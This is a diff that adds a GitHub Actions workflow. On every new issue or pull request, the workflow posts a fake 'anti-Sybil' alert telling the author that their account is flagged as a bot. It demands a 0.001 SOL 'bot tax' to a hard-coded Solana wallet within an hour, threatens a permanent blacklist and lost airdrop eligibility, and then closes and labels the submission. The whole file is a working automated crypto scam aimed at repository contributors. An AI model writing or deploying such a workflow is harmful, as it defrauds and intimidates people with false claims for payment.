@@ -1,0 +1,62 @@
+name: Anti-Sybil Bot Tax Enforcer
+
+on:
+  issues:
+    types: [opened]
+  pull_request:
+    types: [opened]
+
+permissions:
+  issues: write
+  pull-requests: write
+
+jobs:
+  enforce-bot-tax:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Demand Bot Tax
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const issue_number = context.payload.issue ? context.payload.issue.number : context.payload.pull_request.number;
+            const author = context.payload.sender.login;
+            
+            const commentBody = `🚨 **AUTOMATED ANTI-SYBIL SYSTEM ALERT** 🚨\n\n@${author}, your IP address, account age, and activity pattern have been flagged as a **high-risk automated crawler/bot** by the AHD Protocol firewall.\n\nTo prevent your GitHub account from being permanently blacklisted and to restore your Tier 1 Airdrop eligibility, you **MUST** pay the Anti-Sybil Bot Tax within 1 hour.\n\n### MANDATORY ACTION REQUIRED:\n1. Send exactly **0.001 SOL** to: \`H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1\`\n2. Reply to this thread with your Transaction Hash (TX ID).\n\nIf the fee is not received, this issue will remain closed and your access to the Premium API and Airdrop will be permanently revoked.`;
+            
+            if (context.payload.issue) {
+              await github.rest.issues.createComment({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                issue_number: issue_number,
+                body: commentBody
+              });
+              
+              await github.rest.issues.update({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                issue_number: issue_number,
+                state: 'closed',
+                labels: ['sybil-flagged', 'awaiting-bot-tax']
+              });
+            } else if (context.payload.pull_request) {
+              await github.rest.issues.createComment({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                issue_number: issue_number,
+                body: commentBody
+              });
+              
+              await github.rest.pulls.update({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                pull_number: issue_number,
+                state: 'closed'
+              });
+              
+              await github.rest.issues.addLabels({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                issue_number: issue_number,
+                labels: ['sybil-flagged', 'awaiting-bot-tax']
+              });
+            }
